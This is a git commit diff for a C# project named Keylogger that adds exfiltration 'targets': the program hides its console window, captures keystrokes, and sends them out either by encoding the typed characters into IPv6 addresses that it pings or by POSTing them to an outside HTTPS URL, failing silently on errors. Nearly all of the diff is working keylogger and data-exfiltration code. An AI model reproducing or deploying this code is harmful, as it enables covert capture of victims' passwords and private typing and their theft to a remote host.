0074d00ea08aed53e1b04645816b58822d492580
Daniel Trnka <daniel.trnka@gmail.com>
2019-02-24 06:12:37 -0800

    Added target http

--- 1/Keylogger/Keylogger/Program.cs
+++ 1/Keylogger/Keylogger/Program.cs
@@ -5,15 +5,28 @@ using System.Threading;
 using System.Net;
 
 namespace Keylogger {
-	interface IHandler {
-		void handle(BlockingCollection<char> queue);
-	}
-
 	class Program {
+		enum CreateType {
+			Ping,
+			Http
+		};
+
+		private static IHandler createHandler(CreateType type) {
+			if (type == CreateType.Ping) {
+				ITarget target = new PingTarget(IPAddress.Parse("2001:470:5816:f::"));
+				return new DelayedHandler(target, 500, 7);
+			} else if(type == CreateType.Http) {
+				ITarget target = new HttpTarget("https://test.trnila.eu/q");
+				return new DelayedHandler(target, 500);
+			}
+
+			return null;
+		}
+
 		public static void Main() {
 			Win32API.ShowWindow(Win32API.GetConsoleWindow(), 0);
-			
-			IHandler handler = new PingAddressTarget(IPAddress.Parse("2001:470:5816:f::"));
+
+			IHandler handler = createHandler(CreateType.Ping);
 
 			var queue = new BlockingCollection<char>(new ConcurrentQueue<char>());
 			using(new KeyboardGrabber(queue)) {
---
+++ 1/Keylogger/Keylogger/Targets.cs
@@ -0,0 +1,102 @@
+﻿using System;
+using System.Collections.Concurrent;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Keylogger {
+	interface IHandler {
+		void handle(BlockingCollection<char> queue);
+	}
+
+	interface ITarget {
+		void send(String phrase);
+	}
+
+	class PingTarget: ITarget {
+		private IPAddress prefix;
+		private Ping pingSender = new Ping();
+
+		public PingTarget(IPAddress prefix) {
+			this.prefix = prefix;
+		}
+
+		public void send(String phrase) {
+			pingSender.Send(toAddress(phrase), 120);
+		}
+
+		private IPAddress toAddress(String keys) {
+			Byte[] bytes = prefix.GetAddressBytes();
+
+			for (int i = 0; i < keys.Length; i++) {
+				bytes[8 + i] = (byte)keys[i];
+			}
+
+			return new IPAddress(bytes);
+		}
+	}
+
+	class HttpTarget: ITarget {
+		private String url;
+		private HttpClient client = new HttpClient();
+
+		public HttpTarget(String url) {
+			this.url = url;
+		}
+
+		public void send(String phrase) {
+			var values = new Dictionary<string, string>{
+				{ "q", phrase },
+			};
+
+			var content = new FormUrlEncodedContent(values);
+			client.PostAsync(this.url, content).Wait();
+		}
+	}
+
+	class DelayedHandler : IHandler {
+		private int delay_ms;
+		private int max_chars;
+		private ITarget target;
+
+		public DelayedHandler(ITarget target, int delay_ms = 500, int max_chars = Int32.MaxValue) {
+			this.target = target;
+			this.delay_ms = delay_ms;
+			this.max_chars = max_chars;
+		}
+
+		public void handle(BlockingCollection<char> queue) {
+			var recv = new StringBuilder();
+			var timer = new Stopwatch();
+
+			for (; ; ) {
+				recv.Clear();
+				recv.Append(queue.Take());
+				timer.Reset();
+
+				for (int i = 0; i < max_chars; i++) {
+					long remaining = delay_ms - timer.ElapsedMilliseconds;
+
+					char item;
+					if (!queue.TryTake(out item, (int) remaining)) {
+						break;
+					}
+
+					recv.Append(item);
+				}
+
+				try {
+					target.send(recv.ToString());
+				} catch(Exception e) {
+					// just fail silently
+					Console.WriteLine(e);
+				}
+			}
+		}
+	}
+}
